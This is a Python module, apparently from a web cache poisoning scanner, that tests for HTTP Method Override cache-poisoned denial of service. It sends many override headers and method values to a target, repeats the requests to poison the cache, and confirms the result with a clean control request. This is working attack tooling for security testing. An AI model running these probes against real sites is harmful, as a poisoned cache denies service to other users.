#!/usr/bin/env python3

"""
Attempts to find Cache Poisoning with HTTP Method Override (HMO)
https://cpdos.org/#HMO
"""

import utils.proxy as proxy
from utils.style import Colors, Identify
from utils.utils import configure_logger, sys, format_payload, human_time, random, requests, range_exclusion, verify_405_waf

logger = configure_logger(__name__)

VULN_NAME = "HTTP Method Override"


def HMO(
    url: str,
    s: requests.Session,
    initial_response: requests.Response,
    authent: tuple[str, str] | None,
    human: str,
) -> None:
    """Function to test for HTTP Method Override vulnerabilities"""

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    methods = [
        "GET",
        "POST",
        "PATCH",
        "PUT",
        "DELETE",
        "HEAD",
        "TRACE",
        "HELP",
        "OPTIONS",
        "CONNECT",
        "PURGE",
        "RESUME",
        "SEARCH",
        "MERGE",
        "LOCK",
        "UNLOCK",
        "SYNC",
        "ARCHIVE",
        "CLONE",
        "ROLLBACK",
        "EXECUTE",
        "INTROSPECT",
        "NONSENSE",
        # WebDAV methods
        "REPORT",
        "CHECKOUT",
        "COPY",
        "MOVE",
        "MKACTIVITY",
        "MKCOL",
        "PROPFIND",
        "PROPPATCH",
        "VERSION-CONTROL",
        "BASELINE-CONTROL",
        "CHECKIN",
        "UNCHECKOUT",
        "UPDATE",
        "LABEL",
        "MKWORKSPACE",
        "ORDERPATCH",
        "ACL",
        # Event/Notification methods
        "SUBSCRIBE",
        "UNSUBSCRIBE",
        "NOTIFY",
        "POLL",
        # Binding methods
        "BIND",
        "UNBIND",
        "REBIND",
        "LINK",
        "UNLINK",
        # Calendar methods
        "MKCALENDAR",
        # Custom/Exotic methods
        "BATCH",
        "SPACEJUMP",
        "TRACK",
        "BREW",
        "WHEN",
        # Potential attack methods
        "INVALID",
        "BADMETHOD",
        "EXPLOIT",
        "ADMIN",
        "ROOT",
        "BACKDOOR",
        "SHELL",
        "EXEC",
        "EVAL",
        "INCLUDE",
        "REQUIRE",
        "IMPORT",
        "LOAD",
        "DUMP",
        "BACKUP",
        "RESTORE",
        "RESET",
        "FLUSH",
        "CLEAR",
        "WIPE",
        "DESTROY",
        "KILL",
        "TERMINATE",
        "ABORT",
        "CANCEL",
        "STOP",
        "HALT",
        "PAUSE",
        "SUSPEND",
        "CONTINUE",
        "RETRY",
        "REDO",
        "UNDO",
        "REVERT",
        "COMMIT",
        "SAVE",
        "STORE",
        "CACHE",
        "PREFETCH",
        "PRELOAD",
        "REFRESH",
        "RELOAD",
        "RENEW",
        "REPAIR",
        "FIX",
        "HEAL",
        "RECOVER",
        "RESCUE",
        "ESCAPE",
        "BYPASS",
        "OVERRIDE",
        "FORCE",
        "PUSH",
        "PULL",
        "FETCH",
        "GRAB",
        "TAKE",
        "GIVE",
        "SEND",
        "RECV",
        "RECEIVE",
        "ACCEPT",
        "REJECT",
        "DENY",
        "ALLOW",
        "PERMIT",
        "GRANT",
        "REVOKE",
        "AUTHORIZE",
        "AUTHENTICATE",
        "LOGIN",
        "LOGOUT",
        "SIGNIN",
        "SIGNOUT",
        "REGISTER",
        "UNREGISTER",
    ]

    hmo_headers = [
        "HTTP-Method-Override",
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "Method-Override",
        "X-HTTP-Method",
        "HTTP-Method",
        "_method",
        "_methodOverride",
        "X-Requested-Method",
        "X-HTTP-Verb",
        "Request-Method",
        "Override-Method",
        "X-Method",
        "Method",
        "X-Verb",
        "Verb-Override",
        "HTTP-Verb",
        "X-Override",
        "Override",
        "X-Action",
        "Action-Override",
        "X-Request-Method",
        "Request-Override",
        "X-Tunnel-Method",
        "Tunnel-Method",
        "X-Real-Method",
        "Real-Method",
        "X-Original-Method",
        "Original-Method",
        "X-Forward-Method",
        "Forward-Method",
        "X-Proxy-Method",
        "Proxy-Method",
    ]

    main_status_code = initial_response.status_code
    main_len = len(initial_response.content)

    rel = range_exclusion(main_len)

    for header, method in (
        (header, method) for header in hmo_headers for method in methods
    ):
        
        reason = ""
        try:
            uri = f"{url}{random.randrange(999)}"
            probe_headers = {header: method}
            print(
                f" {Colors.BLUE} {VULN_NAME} : {probe_headers}{Colors.RESET}\r", end=""
            )
            print("\033[K", end="")
            probe = s.get(
                uri,
                headers=probe_headers,
                verify=False,
                timeout=10,
                auth=authent,
                allow_redirects=False,
            )
            human_time(human)


            logger.debug(rel)

            if probe.status_code == 405:
                vw = verify_405_waf(probe)
                if vw:
                    print(" └── [i] Human Verification waf activated ! wait a moment and try with -hu option")
                    break

            if probe.status_code != main_status_code and probe.status_code not in [
                main_status_code,
                429,
                401,
                403,
            ]:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code}"
                )
                status = f"{Identify.behavior}"
                severity = "behavior"
            elif (
                len(probe.content) != main_len
                and len(probe.content) not in rel
                and probe.status_code not in [429, 401, 403]
            ):
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(probe.content)}b"
                )
                logger.debug(probe.content)
                status = f"{Identify.behavior}"
                severity = "behavior"
            elif (
                probe.status_code == main_status_code
                and len(probe.content) in rel
            ):
                continue

            for _ in range(3):
                probe = s.get(
                    uri,
                    headers=probe_headers,
                    timeout=10,
                    auth=authent,
                    allow_redirects=False,
                )
                human_time(human)

            control = s.get(uri, verify=False, timeout=10, auth=authent, allow_redirects=False)
            if (
                control.status_code == probe.status_code
                and control.status_code not in [main_status_code, 429, 401, 403]
            ):
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {control.status_code}"
                )
                status = f"{Identify.confirmed}"
                severity = "confirmed"

            elif (
                len(control.content) == len(probe.content)
                and len(control.content) not in rel
                and control.status_code not in [429, 401, 403]
            ):
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(control.content)}b"
                )
                # print(control.content)
                status = f"{Identify.confirmed}"
                severity = "confirmed"

            if reason:
                print(
                    f" {status} | HMO DOS | {Colors.BLUE}{uri}{Colors.RESET} | {reason} | PAYLOAD: {Colors.THISTLE}{format_payload(probe_headers)}{Colors.RESET}"
                )
                if proxy.proxy_enabled:
                    from utils.proxy import proxy_request

                    proxy_request(
                        s,
                        "GET",
                        uri,
                        headers=probe_headers,
                        data=None,
                        severity=severity,
                    )

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
